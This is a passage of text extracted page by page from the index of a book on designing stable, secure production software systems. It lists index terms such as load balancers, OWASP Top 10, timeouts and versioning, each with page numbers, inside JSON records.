least recently used (LRU) algo-\n\nrithms, 105\n\nlegal conditions, 60, 287 let it crash stability pattern,\n\n108–111\n\nLet’s Encrypt, 220 libraries\n\nblocked threads from,\n\n67, 69\n\ntimeouts, 92 vendor libraries and\n\nblocked threads, 67, 69 vendor libraries and inte- gration point failures, 44\n\nwrapping, 68 Lilius, Aloysius, 129 Linux\n\nnetwork interface names,\n\n144\n\nTIME_WAIT, 185\n\nLiskov substitution principle,\n\n65, 265\n\nlisten queues, 37, 75, 119,\n\n183–184\n\nLittle Bobby Tables attack,\n\n216\n\nLittle’s law, 120, 183 load, see also load balancers\n\ndeployment speed, 249 judging load capacity by concurrent users, 281 judging load capacity by\n\nsessions, 281 live control, 210 load shedding, 119–120,\n\n122, 184\n\nload testing, 26, 281–284\n\nload balancers, see al-\n\nso health checks; load\n\nabout, 46 blue/green deployments,\n\n295\n\nbulkheads, 100 canary deployments, 257 chain reactions, 46–49 containers, 150 with DNS, 173–177 fail fast pattern, 106 guidelines, 177–182\n\nIndex • 347\n\nhandshaking, 112 hardware, 180 partitioning request\n\ntypes, 181\n\nround-robin load balanc-\n\ning, 173–174\n\nself-denial attacks, 70 service discovery, 188 software, 178 virtual IP addresses,\n\n178, 189\n\nvirtual LANs (VLANs), 150 virtual machines in the\n\ncloud, 153\n\nload shedding, 119–120, 122,\n\n184\n\nload testing\n\ncosts, 26 crushed ecommerce site,\n\n281–284\n\nloan service example of\n\nbreaking API changes, 268– 271\n\nlock managers\n\nself-denial attacks, 70 virtual machines, 148\n\nlocking\n\noptimistic, 70 pessimistic, 70\n\nlog collectors, 204–206, 227 log indexing, 204 Log4j, 17 logging and log files\n\n12-factor app checklist,\n\n151\n\nadvantages, 165 bad requests, 227 circuit breakers, 97 compliance requirements,\n\n104\n\ndebug logs, 167 indexing logs, 204 levels of logging, 166 log collectors, 204–206,\n\n227\n\nlog file locations, 166 logging servers, 104–105 for postmortems, 16–18 readability, 167 rotating log files, 103–104 software load balancing,\n\n179\n\nsystem-wide transparen-\n\ncy, 204–206",
      "content_length": 3067,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 352,
      "content": "test harness requests,\n\n116\n\ntransparency, 165–169,\n\n204–206\n\nlogrotate, 104 Logstash, 105, 204 longevity, 25 loose clustering, 305 LRU (least recently used) algo-\n\nrithms, 105\n\nM MAC addresses, virtual IP\n\naddresses, 189 machine identity\n\nenumeration, 187 networks, 143–146, 152 virtual machines in the\n\ncloud, 152\n\nMajors, Charity, 330 malicious users, instability\n\npatterns, 60–62\n\nmanual assignment, 244 mapping\n\nrole, 244, 246 session-specific, 223\n\nMars rover, 290 mechanical advantage, 194 Memcached, 54 memory\n\ncache limits, 67, 105 expunging passwords\n\nand keys, 233\n\nheap, 52–54 in-memory caching stabil-\n\nity problems, 105 leaks and chain reac-\n\ntions, 49\n\nleaks and improper\n\ncaching, 105\n\nleaks and slow responses,\n\n85\n\nloss during rollout, 259 migratory virtual IP ad-\n\ndresses, 190\n\noff-heap, 54 off-host, 54 serialization and session failover in ecommerce case study, 287\n\ntraffic problems, 52–54 weak references, 53–54,\n\n67 Mesos, 149, 212\n\nmessaging\n\ndecoupling middleware,\n\n117\n\nin information architec-\n\nture, 314–316\n\nlogging messages, 169 point-to-point communi- cation scaling effects, 73\n\npublish/subscribe mes-\n\nsaging, 73, 117\n\nsystem to system messag-\n\ning, 117\n\nmethods\n\nremote method invocation\n\n(RMI), 18, 27\n\nsynchronizing, 64–66 metric collectors, 204–206 metrics\n\naggregating, 204 blocked threads, 63 circuit breakers, 97 guidelines, 204 instance, 169 metric collectors, 204–\n\n206\n\nsystem-wide transparen-\n\ncy, 204–206 thresholds, 206\n\nmicrokernels, 303 microservices\n\nbulkheads, 101 cautions, 304 evolutionary architecture,\n\n303\n\nlet it crash pattern, 109 middleware, defined, 117, see also decoupling middleware migrations frameworks, 250,\n\n260\n\nmigratory virtual IP address-\n\nes, 189\n\nmixed workload, defined, 24 mock objects, 114 modeling tools for schema\n\nchanges, 260\n\nmodular operators, 308–313 modules\n\naugmenting, 310 excluding, 310 inverting, 311 porting, 312 splitting, 308 substituting, 310\n\nMongoDB hostage attack, 225\n\nIndex • 348\n\nmonitoring\n\nback pressure, 123 blocked threads, 63 cache hit rates, 67 chaos engineering, 330 containers, 149 coupling and transparen-\n\ncy, 164\n\nhuman pattern matching,\n\n131\n\nload levels, 184 load shedding, 120, 184 open-source services, 172 real-user monitoring,\n\n200–201\n\nresource contention, 184 role in platform, 197 slow responses, 85 supplementing with exter-\n\nnal, 63 multicasts, 73, 264 multihoming, 143–146 multiplier effect, 73, see al-\n\nso force multiplier antipat- tern\n\nmultithreading, see al- so threads, blocked\n\ncircuit breakers, 97 stability and, 62–69\n\nmutexes, timeouts, 92\n\nN Nakama, Heather, 329 names\n\nconfiguration properties,\n\n162\n\nfilenames and directory traversal attacks, 224\n\nfully qualified domain name (FQDN), 143 machine identity, 143–\n\n146, 152\n\nservice discovery with\n\nDNS, 173\n\nNAS, 147 NASA, 290 National Health Service, 215 native code, defined, 87 navel-gazing, 62 Netflix\n\nChaos Automation Plat-\n\nform (ChAP), 334 failure injection testing\n\n(FIT), 332 metrics, 169",
      "content_length": 2981,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 353,
      "content": "Simian Army, 328–335 Spinnaker, 243 Netscape, cookie develop-\n\nment, 58\n\nnetwork interface controllers,\n\nsee NICs\n\nnetworks\n\nas abstraction, 36 administrative access-\n\nonly, 145\n\ncontainer challenges, 149 enumeration problems,\n\n187\n\nfoundation layer, 142–\n\n146\n\nintegration points stabili- ty antipatterns, 33–46 interface names, 143–146 machine identity, 143–\n\n146, 152\n\noutbound connections,\n\n146\n\noverlay networks, 149 routing guidelines, 186–\n\n188\n\nslow responses from, 85 software-defined network-\n\ning, 187\n\nTCP basics, 36–38 test harnesses, 114–117 VPNs, 186 New Relic, 200 nginx, 179 NICs\n\ndefault gateways, 186 loopback, 143 machine identity, 143–\n\n146, 153\n\nqueue backups, 183\n\nnonlinear effect, 183 NTLM, 221 nut theft crisis, 215\n\nO OAuth, 221 observe, orient, decide, act\n\n(OODA) loop, 291\n\nOccupational Safety and\n\nHealth Administration (OS- HA), 83\n\nODBC driver, migratory virtu-\n\nal IP addresses, 190\n\noff-heap memory, 54 off-host memory, 54\n\n“On the Criteria to Be Used\n\nin Decomposing Systems”, 310\n\nOODA (observe, orient, de-\n\ncide, act) loop, 291\n\nOpen Web Application Securi- ty Project, see OWASP Top 10\n\nOpenJDK, warm-up period,\n\n209\n\nOpera, SameSite attribute,\n\n228\n\noperations\n\nfallacy of DevOps, 294 in layer diagram, 141 separation from develop-\n\nment in past, 292 operators, modular, 308–313 optimistic locking, 70 Oracle, see also JDBC driver\n\ndead connection detec-\n\ntion, 42\n\nODBC driver, 190\n\norchestration, 206 organization\n\nadaptation and, 290–301 efficiency cautions, 300 platform roles, 197–199 team, 4, 197–199, 292–\n\n294, 299\n\nteam-scale autonomy,\n\n298\n\nORMs, unbounded result\n\nsets, 88\n\nOSHA (Occupational Safety\n\nand Health Administration), 83\n\noutbound connections, 146 outbound integration, live\n\ncontrol, 210\n\noverlay network, 149 overrides, ecommerce case\n\nstudy, 281\n\nOWASP Top 10, 216–231\n\nAPIs, 230 broken access control,\n\n222–224\n\ncomponents with known vulnerabilities, 229 cross-site request forgery\n\n(CSRF), 228\n\ncross-site scripting (XSS),\n\n219, 221, 228 injection, 216–218\n\nIndex • 349\n\ninsufficient attack preven-\n\ntion, 227\n\nsecurity misconfigura-\n\ntion, 225\n\nsensitive data exposure,\n\n226\n\nsession hijacking, 218–\n\n222\n\nP PaaS\n\nassignment, 244 certificate management,\n\n220\n\ndiscovery services, 189 immutable infrastructure\n\nand, 246\n\nlet it crash pattern, 110 open-source tools, 172\n\npackaging\n\ndeployment, 245 package repository, 208\n\npackets\n\nback pressure, 121 packet capture, 38, 40 SYN/ACK packets, 37 pagination, unbounded result\n\nsets, 89 parameters\n\nchecking and fail fast\n\npattern, 107\n\nimplicit context, 307\n\nParnas, David, 310 parsing\n\nAPI security, 230 injection vulnerabilities,\n\n216–218 Parsons, Rebecca, 302 partitioning\n\nairline case study, 27 backup traffic, 145 with bulkheads, 47, 49,\n\n98–101\n\ndiscovery services, 188 request types with load\n\nbalancers, 181\n\nsplitting modular opera-\n\ntor, 308\n\nthreads inside a single\n\nprocess, 100\n\npasswords\n\nconfiguration files, 161 configured passwords,\n\n232\n\ndefault, 225 resources, 226 salt, 220, 226",
      "content_length": 3014,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 354,
      "content": "security guidelines, 220,\n\n232\n\nstoring, 226 vaulting, 150, 232\n\npatch management tools and\n\ncontainers, 231\n\npattern detection, 167 Pattern Languages of Program\n\nDesign 2, 66, 97\n\npatterns, see stability antipat- terns; stability patterns Patterns of Enterprise Applica-\n\ntion Architecture, 92 PDQ analyzer toolkit, 184 performance\n\nqueue depth as indicator,\n\n202\n\nvirtual machines, 147\n\npessimistic locking, 70 Petroski, Henry, 301 photography example of fail\n\nfast, 107\n\npie crust defense, 220, 226,\n\n234\n\npilot-induced oscillation, 292 placement services, 209 platform\n\ncontrol plane, 197–199 costs, 202 goals, 293–294 platform services and\n\nneed for own platform team, 294\n\nplatform services guide-\n\nlines, 212–213\n\nroles, 197–199, 292–294,\n\n299\n\nteam-scale autonomy,\n\n299\n\nplatform-as-a-service,\n\nsee PaaS\n\nplugins\n\nevolutionary architecture,\n\n303\n\nsecurity, 158, 208, 229\n\nplurality, embracing, 321–322 point-to-point communication scaling effects, 72–73, 75\n\npolicy proxy, 317 porpoising, 292 porting modular operator,\n\n312\n\nports\n\n12-factor app checklist,\n\n151\n\nbinding, 151 containers, 149 test harnesses and port\n\nnumbers, 116 POST, versioning API changes, 269, 271\n\nPostel’s Robustness Principle,\n\n263, 265\n\nPostel, John, 263 postmortems\n\nairline case study, 14–20 Amazon Web Services S3 service outage, 195– 197\n\nBlack Friday case study,\n\n135\n\nlogging state transitions,\n\n169\n\nfor successful changes,\n\n196\n\ntasks, 195\n\npower-law distribution, 88,\n\n304\n\npragmatic architecture, 5 pre-autoscaling, 71 pressure, see back pressure price checkers, see competi-\n\ntive intelligence\n\nprimitives\n\nchecking for hangs, 64,\n\n69\n\nsafe, 64, 69 timeouts, 92\n\nprinciple of ignorance, 305 Principles of Product Develop-\n\nment Flow, 300\n\nprivilege principle, least, 231 PRNG (pseudorandom num-\n\nber generator), 219 process binding, 100 processes\n\n12-factor app checklist,\n\n151\n\nbinding, 100 circuit breaker scope, 97 code guidelines, 157–160 configuration guidelines,\n\n160–162 defined, 156 deployment diagram, 156 instances layer, 155–170 let it crash pattern, 109\n\nIndex • 350\n\npartitioning threads in-\n\nside, 100\n\nruntime diagram, 156 transparency guidelines,\n\n162–170\n\nproduction, designing for, see also deployment; stability\n\ncontrol plane layer, 141,\n\n193–214\n\ncosts, 3 foundation layer, 141–\n\n154\n\ninstances layer, 141,\n\n155–170\n\ninterconnection layer,\n\n141, 171–191\n\nlayer diagram, 141, 171 need for, 1–6 priorities, 141 security layer, 215–234\n\nproperties\n\nlisting changes for ecom- merce case study, 280\n\nnaming configuration,\n\n162\n\nprovisioning services, guide-\n\nlines, 207\n\npseudorandom number gener-\n\nator (PRNG), 219\n\npublish/subscribe messaging,\n\n73, 117 pull mode\n\ndeployment tools, 208 log collectors, 204 pulse and dogpiles, 80 push mode\n\ndeployment tools, 208 log collectors, 204\n\nPUT, versioning API changes,\n\n269\n\nQ quality assurance (QA)\n\ncrushed ecommerce site case study, 278–281\n\noverfocus on, 1 quality of environment,\n\n199\n\nunbounded result sets,\n\n88\n\nquery objects, 92 queues\n\nback pressure, 120–123 backups and system fail-\n\nures, 182\n\ncommand queue, 211",
      "content_length": 3078,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 355,
      "content": "depth as indicator of per-\n\nformance, 202\n\nlisten queue purge, 185 listen queues, 37, 75,\n\n119, 183–184 load shedding, 120 point-to-point communi- cation scaling effects, 73\n\nretries, 94 TCP networking, 37 virtual machines in the\n\ncloud, 153\n\nquorum-based consensus,\n\n206\n\nR race conditions\n\ncascading failures, 50 Latency Monkey, 331 load balancers and chain\n\nreactions, 46–49\n\nransomware, 215 real-user monitoring (RUM),\n\n200–201\n\nrecovery\n\nchaos engineering, 330 comparing treatment op-\n\ntions, 137\n\ndisaster, 180, 335 hardware load balancing,\n\n180\n\nRecovery-Oriented Com-\n\nputing, 138\n\nrestoring service as prior-\n\nity, 12 targets, 12 timeouts, 94\n\nRecovery-Oriented Computing\n\n(ROC), 138\n\nReddit.com outage example,\n\n80–83, 123, 194, 196\n\nRedis, 54 redundancy, 98 references, weak, 53–54, 67 relational databases\n\ndeployment, 250–252,\n\n260\n\nimplicit context, 307 paradigm, 313\n\nremote method invocation\n\n(RMI), 18, 27\n\nreputation and poor stability,\n\n24\n\nrequest framing, 264, 269 residence time, 184\n\nresilience engineering, 326 resources\n\nauthorizing access to,\n\n223\n\nblocked threads, 64, 68 cascading failures, 50 data purging, 102, 107 fail fast pattern, 106 load shedding, 119, 184 metrics, 205 scaling effects of shared\n\nresources, 73\n\nshared-nothing architec-\n\nture, 70, 74\n\nslow responses, 86 steady state pattern,\n\n102–106 timeouts, 92 virtual machines, 147\n\nresources for this book book web page, xiv cross-site request forgery\n\n(CSRF), 229\n\ncross-site scripting (XSS),\n\n222\n\ndirectory traversal at-\n\ntacks, 224\n\ngeneral security, 234 injection, 217 passwords, 226\n\nresponses, slow, see slow re-\n\nsponses\n\nretailer examples\n\nBlack Friday case study,\n\n129–139, 163\n\nchain reaction example,\n\n48\n\ncrushed ecommerce site,\n\n277–288\n\nEtsy deployment, 239 integration point failure\n\nexample, 35\n\nretries\n\ncascading failures, 50 dogpiles, 80 listen queue purge, 185 migratory virtual IP ad-\n\ndresses, 190\n\nqueuing, 94 timeouts, 93\n\nrevenue and transparency,\n\n202\n\nreverse proxy servers, soft- ware load balancing, 178\n\nrisk cycle, 246 RMI (remote method invoca-\n\ntion, 18\n\nIndex • 351\n\nRMI (remote method invoca-\n\ntion), 27\n\nrobots, OSHA guidelines, 83,\n\nsee also shopbots\n\nrobots.txt file, 59 Robustness Principle, Pos-\n\ntel’s, 263, 265\n\nROC (Recovery-Oriented\n\nComputing), 138\n\nrole mapping, 244, 246 rolling deployments, speed,\n\n248\n\nrollout, deployment phase,\n\n257–259\n\nroot certificate authority files,\n\n230\n\nroot privileges, 231 round-robin load balancing,\n\n173–174\n\nrouting\n\ncontent-based, 181 guidelines, 186–188 software-defined network-\n\ning, 187\n\nstatic route definitions,\n\n187\n\nRS-232, 111 RUM (real-user monitoring),\n\n200–201\n\nruntime\n\ncosts, 202 diagram, 156\n\nRx frameworks, back pres-\n\nsure, 121\n\nS salt, 220, 226 SameSite attribute, 228 sample applications and secu-\n\nrity, 225\n\nSAN, 147 Sarbanes–Oxley Act of 2002,\n\n104\n\nScala and actors, 108 scaling, see also autoscaling chain reactions, 46 elastic scaling and deploy-\n\nment tools, 208\n\nhorizontal scaling, de-\n\nfined, 46\n\nmultiplier effect, 73 need for load balancing,\n\n177",
      "content_length": 3050,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 356,
      "content": "point-to-point communi- cation scaling effects, 75\n\nscaling effects and shared\n\nresources, 73\n\nscaling effects and trans-\n\nparency, 164\n\nscaling effects in point-to- point communication, 72–73\n\nscaling effects stability antipattern, 71–75 self-denial attacks, 70 unbalanced capacities,\n\n77\n\nvertical, 46\n\nschemaless databases, deploy-\n\nment, 252–255, 260\n\nscope, circuit breakers, 97 scrapers\n\nsession bloat from, 285,\n\n287\n\nstability problems, 59–60\n\nscript kiddies, 61 scripts, startup scripts and\n\nthread dumps, 17\n\nsearch engines, session bloat\n\nfrom, 284\n\nsecurity\n\nadministration, 225, 231 advanced persistent\n\nthreat, 60\n\nAPIs, 230 attack surfaces, 225 authentication, 218–222 blacklists, 227 broken access control,\n\n222–224\n\nbuilds, 157, 208 bulkheads, 230 certificate revocation list\n\n(CRL), 227\n\ncertificates, 219, 227,\n\n230\n\nchain of custody, 157 components with known vulnerabilities, 229 configuration, 161, 225 configured passwords,\n\n232\n\ncontainers, 225, 231 cookies, 58, 219 costs, 215 cross-site request forgery\n\n(CSRF), 228\n\ncross-site scripting (XSS),\n\n219, 221, 228\n\ndependencies, 158, 229 direct object access, 223 directory traversal at-\n\ntacks, 224\n\ndistributed denial-of-ser- vice (DDoS) attacks, 61\n\nHTTP Strict Transport\n\nSecurity, 226\n\ninformation leakage, 224 injection, 216–218 insufficient attack preven-\n\ntion, 227\n\nInternet of Things, 61 intrusion detection soft-\n\nware, 232\n\nleast privilege principle,\n\n231\n\nlogging bad requests, 227 malicious users, 60–62 misconfiguration, 225 as ongoing process, 233 OWASP Top 10, 216–231 pie crust defense, 220,\n\n226, 234\n\nplugins, 158, 208, 229 ransomware, 215 resources on, 222, 224,\n\n226, 229, 234\n\nsample applications, 225 script kiddies, 61 security layer, 215–234 sensitive data exposure,\n\n226\n\nsession fixation, 218 session hijacking, 218–\n\n222\n\nsession prediction attack,\n\n219\n\nURL dualism, 321 self-contained systems, 303 self-denial attacks, 69–71, 76 sensitive data exposure, 226 serialization and session\n\nfailover in ecommerce case study, 287\n\nservice discovery, see discov-\n\nery services\n\nservice extinction, 296–298 service-oriented architecture\n\nand bulkheads, 101\n\nservices\n\ncontrol of identifiers,\n\n316–318 defined, 155\n\nIndex • 352\n\nservice extinction, 296–\n\n298\n\nservice-oriented architec-\n\nture, 101\n\nsession IDs\n\ncross-site scripting (XSS),\n\n219, 221, 228 generating, 219 self-denial attacks, 71 session hijacking, 218–\n\n222\n\nsession prediction attack,\n\n219\n\nsession affinity, 255 session failover\n\necommerce case study\n\nand serialization, 287 shared-nothing architec-\n\nture, 74 session fixation, 218 session prediction attack, 219 sessions, see also cookies as abstraction, 58 bloat from scrapers and\n\nspiders, 285, 287\n\ncaching, 58 cross-site scripting (XSS),\n\n219, 221, 228\n\ndeployment time-frame,\n\n249\n\ndistributed denial-of-ser- vice (DDoS) attacks, 61\n\nheap memory, 52–54 judging load capacity by\n\ncounting, 281\n\nmemory loss during roll-\n\nout, 259\n\noff-heap memory, 54 replication in crushed ecommerce site case study, 284–288 session affinity, 255 session fixation, 218 session hijacking, 218–\n\n222\n\nsession prediction attack,\n\n219\n\nsession-sensitive URLs,\n\n223\n\nsession-specific mapping,\n\n223\n\nshared-nothing architec-\n\nture, 74\n\nstickiness, 181, 258 throttling, 286 unwanted user problems,\n\n57–60",
      "content_length": 3297,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 357,
      "content": "SHA-1, 226 shared-nothing architecture,\n\n70, 74\n\nshed load stability pattern,\n\n119–120, 122, 184 Shermer, Michael, 167 shims, 250, 259 shopbots, 59–61, 285, 287 signal for confirmation, 84 Simian Army, 328–335 Single System of Record, 321 slow responses\n\ncircuit breakers, 98 fail fast pattern, 107 handshaking, 112 as indistinguishable from crashes, 63–64, 84\n\nload shedding, 120 stability antipattern, 84,\n\n89\n\ntest harnesses, 116 timeouts, 94 unbounded result sets,\n\n89\n\nsocial media, growth in users,\n\n31, 88 sockets\n\nas abstraction, 36, 40 back pressure, 121 closed, 55 integration point failures,\n\n35–43\n\nnumber of connectors, 54 test harnesses, 116 traffic failures, 54\n\nsoft references, see weak ref-\n\nerences\n\nsoftware crisis, 31 software-defined networking,\n\n187\n\nSolaris, network interface\n\nnames, 144\n\nspeculative retries, cascading\n\nfailures, 50\n\nspider integration points dia-\n\ngram, 33\n\nspiders\n\nsession bloat from, 285,\n\n287\n\nstability problems, 59–60\n\nSpinnaker, 243 Spirit rover, 290 splitting, see partitioning\n\nsplitting modular operator,\n\n308\n\nSplunk, 204 SQL injection, 216 SQLException\n\nairline case study, 20, 27 JDBC driver, 20 square-cube law, 71 Squid, 179 SSH ports, virtual machines\n\nin the cloud, 153\n\nstability, see also stability\n\nantipatterns; stability pat- terns\n\nchain of failure, 28–30 costs of poor stability, 23 defined, 24 failure modes, 26–28 global growth in users,\n\n31\n\ngrowth in complexity, 32 importance of, xiii, 23 longevity tests, 25 stopping crack propaga-\n\ntion, 27–29\n\nstability antipatterns, 31–90, see also slow responses; threads, blocked\n\ncascading failures, 48– 51, 85, 94, 98, 107 chain reactions, 46–49,\n\n68\n\ndogpile, 78–80, 211 force multiplier, 80–84,\n\n123, 194\n\nintegration points, 33–\n\n46, 94\n\nscaling effects, 71–75 self-denial attacks, 69–\n\n71, 76\n\nunbalanced capacities,\n\n75–78, 98, 112\n\nunbounded result sets,\n\n86–90, 94 users, 51–62\n\nstability patterns, 91–125, see also circuit breakers; timeouts\n\nback pressure, 76, 120–\n\n123\n\nbulkheads, 47, 49, 76,\n\n98–101\n\ndecoupling middleware, 45–46, 70, 117–119 fail fast, 86, 94, 106–108 governor, 123–125, 194,\n\n296\n\nIndex • 353\n\nhandshaking, 46, 76,\n\n111–113\n\nlet it crash, 108–111 load shedding, 119–120,\n\n122, 184\n\nsteady state, 89, 101–106 test harnesses, 45, 77,\n\n113–117\n\nstate\n\nglobal state and implicit\n\ncontext, 307\n\nimmutable infrastruc-\n\nture, 158\n\nlogging transitions, 169 steady state pattern, 89,\n\n101–106\n\nstatic assets, deployment\n\npreparation, 256\n\nstatic routes, 187 steady state\n\nstability pattern, 101–106 unbounded result sets,\n\n89\n\nstrain, defined, 25 stress\n\ndefined, 24 expensive transactions,\n\n56\n\nfail fast pattern, 107\n\nstress testing\n\nunbalanced capacities,\n\n78\n\nuser instability problems,\n\n62\n\nvendor libraries, 68\n\nStruts 2, 229 subnets, software-defined\n\nnetworking, 187\n\nsubscribe/publish messaging,\n\n73, 117\n\nsubstitution modular opera-\n\ntor, 310\n\nsubstitution principle, Liskov,\n\n65, 265\n\nsupervision tree, 109 supervisors, let it crash pat-\n\ntern, 109\n\nSwagger UI, 210 Sydney Opera House, 307 symlinks, 166 SYN/ACK packet, 37 synchronizing\n\nmethods on domain ob-\n\njects, 64–66\n\ntimeouts, 92",
      "content_length": 3135,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 358,
      "content": "syslog, 204 system\n\nadaptation and system\n\narchitecture, 301–313\n\ndefined, 24 loose clustering, 305 self-contained systems,\n\n303\n\nsystem to system messag- ing and decoupling middleware, 117\n\nsystem-level transparen-\n\ncy, 163, 200–206\n\nsystem failures\n\ncascading failures, 49–51 queue backups, 182 slow processes vs. crash-\n\nes, 63–64\n\nT Taleb, Nassim, 328 TCP\n\n5 a.m. problem, 38–43 back pressure, 121 connection duration, 40 handshaking, 36, 111,\n\n183\n\nHTTP protocols and inte- gration point failures, 43\n\nintegration point failures,\n\n35–43\n\nload shedding, 119 multicasts, 73 networking basics, 36–38 number of socket connec-\n\ntors, 54\n\nqueue failures, 182 unbounded result sets,\n\n88\n\nvirtual IP addresses, 55\n\nThe TCP/IP Guide, 39 TCP/IP Illustrated, 39 tcpdump, 38, 40 teaming interfaces, 144 teams\n\nadoption teams, 294 assignments, 4 autonomy, 298 goals, 294 platform roles, 197–199,\n\n292–294, 299\n\ntransformation teams,\n\n294\n\ntechnology frontier, 32 terms of use, 60, 287\n\ntest harnesses\n\ncompared to mock ob-\n\njects, 114\n\nexplicit context, 307 framework, 116 integration point failures,\n\n45\n\nstability pattern, 113–117 unbalanced capacities,\n\n77\n\ntesting, see also integration testing; test harnesses\n\nBlack Friday diagnostic\n\ntests, 135\n\ncontract tests, 267, 272 database changes, 251,\n\n254\n\ndeveloping for, 279 environment, 251 expensive transactions,\n\n56\n\nexplicit context, 307 failure injection testing\n\n(FIT), 332\n\nfunctional, 45, 116 gap in ecommerce case\n\nstudy, 285 generative, 266 inbound, 266 integration point failures,\n\n45\n\nload, 26, 281–284 longevity tests, 25 overfocus on, 1 stress, 62, 68, 78 unbalanced capacities,\n\n77\n\nunit testing with mock\n\nobjects, 114\n\nthird-party authentication,\n\n221\n\nthrashing, 292 thread dumps\n\nBlack Friday case study,\n\n135\n\nfor postmortems, 16–18\n\nthreads, blocked\n\nairline case study, 27 back pressure, 121 cascading failures, 50, 68 chain reactions, 48, 68 metrics, 63 monitoring, 63 partitioning threads in- side a single process, 100\n\nreasons for, 63 slow network failures, 37\n\nIndex • 354\n\nslow processes vs. crash-\n\nes, 63–64\n\nstability antipattern, 62–\n\n69\n\nsynchronizing methods\n\non domain objects, 64– 66\n\ntimeouts, 92, 94 vendor libraries, 44, 67,\n\n69\n\nthrottling sessions, 286 TIME_WAIT, 55, 185 timeouts\n\nairline case study, 27 blocked threads, 68–69,\n\n92, 94\n\ncascading failures, 50,\n\n94, 107\n\nwith circuit breakers, 94,\n\n98\n\ncomplexity, 93 HTTP protocols, 43 integration point failures,\n\n46, 94\n\nlatency problems, 94 live control, 210 stability pattern, 91–95 TCP sockets, 37, 41 unbounded result sets,\n\n94\n\nvendor libraries, 68\n\nTLS certificates, 219, 230 toggles, feature, 210, 260 traffic, user stability antipat-\n\nterns, 51–55\n\ntransactions\n\ndefined, 24 expensive transactions\n\nand stability problems, 56\n\ntesting expensive transac-\n\ntions, 56\n\ntransformation teams, 294 translation pipeline, 252 Transmission Control Proto-\n\ncol, see TCP transparency\n\ndata collection, 163–170 designing for, 164 economic value, 200–201 instance-level, 162–170 logs and stats, 165–169,\n\n204–206\n\nreal-user monitoring,\n\n200–201",
      "content_length": 3079,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 359,
      "content": "risk of fragmentation,\n\n203\n\nsystem-level, 163, 200–\n\n206\n\ntraversal attacks, directory,\n\n224\n\ntrickle, then batch migra-\n\ntions, 254–255\n\ntriggers, database, 250, 259 Tripwire, 232 trust stores, 219\n\nU UDP broadcasts, 73 UDP multicasts, 73 unbalanced capacities\n\ncircuit breakers, 98 handshaking, 76, 112 stability antipattern, 75–\n\n78\n\nunbounded result sets, 86–\n\n90, 94\n\nunit testing and mock ob-\n\njects, 114\n\nUNIX\n\nJava thread dumps, 16 log file accumulation, 103 network interface names,\n\n144\n\nsymlinks for log files, 166 uploads and directory traver-\n\nsal attacks, 224\n\nURLs\n\nauthorizing access to ob-\n\njects, 223\n\nbroken access control,\n\n222–224\n\ndualism, 318–321 probing, 223 session-sensitive, 223 version discriminator,\n\n269\n\nusers\n\nblacklists and whitelists,\n\n227\n\nexpensive transactions,\n\n56\n\ngrowth in social media,\n\n31, 88\n\njudging load capacity by\n\nconcurrent, 281\n\nmalicious, 60–62 metrics, 205 real-user monitoring and transparency, 200–201\n\nstability antipatterns, 51–\n\n62\n\ntraffic problems, 51–55 unwanted, 57–60\n\nV validations\n\ncache invalidation, 67,\n\n105\n\nfail fast pattern, 106\n\nVault, 226, 233 vaulting, 150, 232 vendors\n\nblocked threads from li- braries, 44, 67, 69\n\ndistributed denial-of-ser- vice (DDoS) products, 61\n\nintegration point failures,\n\n44\n\nversion control, 158, 161 VersionEye, 229 versioning, 263–273 deployment, 255 events, 315 handling others’ versions,\n\n270–273\n\nhandling own versions,\n\n263–270\n\nwith headers, 264, 269 supplying both old and new versions, 269\n\nusing numbers for debug-\n\nging, 268\n\nversion discriminator,\n\n269\n\nweb assets, 256\n\nvertical scaling, 46, see al-\n\nso scaling\n\nVIPs, see virtual IP addresses virtual IP addresses\n\nglobal server load balanc-\n\ning, 175\n\nload balancers, 178, 189 migratory, 189 sockets and traffic prob-\n\nlems, 55\n\nsoftware-defined network-\n\ning, 187\n\nvirtual LANs (VLANs), 149–\n\n150, 187\n\nvirtual extensible LANs\n\n(VXLANs), 150 virtual machines\n\nbulkheads, 98 clocks, 148\n\nIndex • 355\n\nin cloud, 152 configuration mapping,\n\n244\n\nelastic scaling and deploy-\n\nment tools, 208\n\nin foundation layer, 146–\n\n147, 152\n\npackaging, 245 separating out log files,\n\n166\n\nsoftware-defined network-\n\ning, 187\n\nVLANs, see virtual LANs VLANs (virtual LANs), 149–\n\n150, 187\n\nVolkswagen microbus para-\n\ndox, 328\n\nvoodoo operations, 167 VPNs, 186 VXLANs (virtual extensible\n\nLANs), 150\n\nW WannaCry ransomware, 215 weak references, 53–54, 67 web assets, deployment, 255 Weinberg, Gerald, 327 “‘What Do You Mean by ’Event-Driven’?”, 314 white-box technology, 164 whitelists, 227 Why People Believe Weird\n\nThings, 167\n\nWi-Fi and NICs, 143 Winchester “Mystery” House,\n\n307 Windows\n\nJava thread dumps, 16 memory dumps and secu-\n\nrity, 233\n\nnetwork interface names,\n\n144\n\nrotating log files, 104\n\nWireshark, 38, 40 working-set algorithms, 105\n\nX Xbox 360, 69 XML external entity (XXE) in-\n\njection, 217\n\nXML injection attacks, 217",
      "content_length": 2888,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 360,
      "content": "XSS (cross-site scripting),\n\n219, 221, 228\n\nXXE (XML external entity) in-\n\njection, 217\n\nY Yahoo! security breach, 215\n\nZ zombie apocalypse simula-\n\ntion, 335 ZooKeeper\n\nabout, 161, 188, 206 Reddit.com outage exam- ple, 80–83, 123, 196\n\nIndex • 356",
      "content_length": 248,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 361,
